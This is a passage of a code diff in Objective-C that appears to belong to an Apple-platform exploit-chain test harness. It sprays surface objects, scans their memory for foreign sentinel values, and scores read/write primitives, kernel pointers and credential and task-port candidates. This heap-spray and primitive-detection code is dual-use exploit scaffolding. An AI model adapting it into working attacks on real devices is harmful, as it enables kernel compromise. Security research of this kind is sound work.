+                sym.unlock(spray[i+1], 0, NULL);
+                sym.unlock(spray[i], 0, NULL);
+            }
+            log([NSString stringWithFormat:@"CHAIN: R/W check — %d pairs, %d primitives confirmed", pairsChecked, rwPrimitives]);
+        }
+
+        // Step 5: Cross-surface sentinel verification
+        if (!isr_stopped() && sprayed >= 2) {
+            log(@"CHAIN: Step 5 — Cross-surface sentinel verification");
+
+            int crossFound = 0;
+            for (int i = 0; i < sprayed && !isr_stopped(); i++) {
+                if (!spray[i]) continue;
+                sym.lock(spray[i], 0, NULL);
+                void *base = sym.getBase(spray[i]);
+                if (base) {
+                    size_t allocSz = sym.getAllocSize(spray[i]);
+                    vm_address_t addr = (vm_address_t)base;
+                    for (vm_offset_t off = 0; off < allocSz && off < 0x80000; off += 1024) {
+                        uint64_t val = 0;
+                        vm_size_t outSz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(), addr + off, 8, (vm_address_t)&val, &outSz);
+                        if (kr == KERN_SUCCESS && outSz == 8) {
+                            if ((val & 0xFFFF000000000000ULL) == 0xFACE000000000000ULL) {
+                                int srcSurf = (int)((val >> 16) & 0xFFFF);
+                                if (srcSurf != i) {
+                                    crossFound++;
+                                    anomalies += 5;
+                                    if (crossFound <= 5) {
+                                        log([NSString stringWithFormat:@"CHAIN: CROSS-SURFACE SENTINEL surface[%d]+0x%lx from surface[%d]",
+                                             i, (unsigned long)off, srcSurf]);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                sym.unlock(spray[i], 0, NULL);
+            }
+            log([NSString stringWithFormat:@"CHAIN: Cross-surface — %d foreign sentinels found", crossFound]);
+        }
+
+        for (int i = 0; i < SPRAY_COUNT; i++) {
+            if (spray[i]) CFRelease(spray[i]);
+        }
+        #undef SPRAY_COUNT
+
+        if (anomalies >= 50) verdict = @"CRITICAL";
+        else if (anomalies >= 20) verdict = @"HIGH";
+        else if (anomalies >= 5) verdict = @"MEDIUM";
+
+        gettimeofday(&tv_end, NULL);
+        double elapsed = (tv_end.tv_sec - tv_start.tv_sec) + (tv_end.tv_usec - tv_start.tv_usec) / 1e6;
+
+        NSDictionary *res = @{
+            @"anomalyCount": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"kernelPtrs": @(kernelPtrs),
+            @"credCandidates": @(credCandidates),
+            @"taskPortCandidates": @(taskPortCandidates),
+            @"rwPrimitives": @(rwPrimitives),
+            @"expandedMappings": @(expandedMappings)
+        };
+        isr_checkpoint(@"ISR-ExploitChain-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
